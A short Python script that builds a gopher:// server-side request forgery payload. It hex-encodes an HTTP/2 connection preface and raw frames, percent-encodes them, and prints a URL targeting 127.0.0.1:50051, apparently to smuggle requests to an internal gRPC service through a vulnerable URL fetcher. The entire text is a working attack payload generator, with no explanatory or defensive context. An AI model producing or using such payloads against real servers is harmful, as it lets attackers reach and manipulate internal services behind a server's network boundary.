hex_payload = """505249202a20485454502f322e300d0a0d0a534d0d0a0d0a
000000040000000000
000000040100000000

000008060100000000efb436b96ad8575c
0000040800000000000000000500000806000000000002041010090e0707
"""
#gopher://<IP>:<Port>/_<URL_Encoded_Payload>
def encode_gopher(hex_str):
    hex_str = hex_str.replace("\n", "").replace(" ", "").replace("\t", "").strip()
    result = ""
    for i in range(0, len(hex_str), 2):
        result += "%" + hex_str[i:i+2]
    return result

print("gopher://127.0.0.1:50051/_" + encode_gopher(hex_payload))